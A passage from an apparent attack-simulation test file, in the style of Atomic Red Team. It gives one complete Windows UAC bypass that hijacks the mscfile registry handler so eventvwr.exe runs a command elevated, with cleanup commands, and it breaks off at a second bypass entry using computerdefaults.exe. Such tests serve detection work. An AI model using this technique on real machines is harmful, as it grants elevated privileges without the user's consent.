    supported_platforms:
      - windows
    executor:
      name: command_prompt
      command: |
        reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe /c whoami > %TEMP%\uac_eventvwr.txt" /f
        eventvwr.exe
        timeout /t 3 >nul
        type %TEMP%\uac_eventvwr.txt 2>nul
      cleanup_command: |
        reg delete "HKCU\Software\Classes\mscfile" /f >nul 2>&1
        del /f %TEMP%\uac_eventvwr.txt >nul 2>&1
      elevation_required: false

  - name: "UAC Bypass via computerdefaults.exe"
    auto_generated_guid: c1c1d1e1f1a2b2c2d2e2f2a3b3c3d3e3
    description: |
      Uses computerdefaults.exe for UAC bypass.
    supported_platforms:
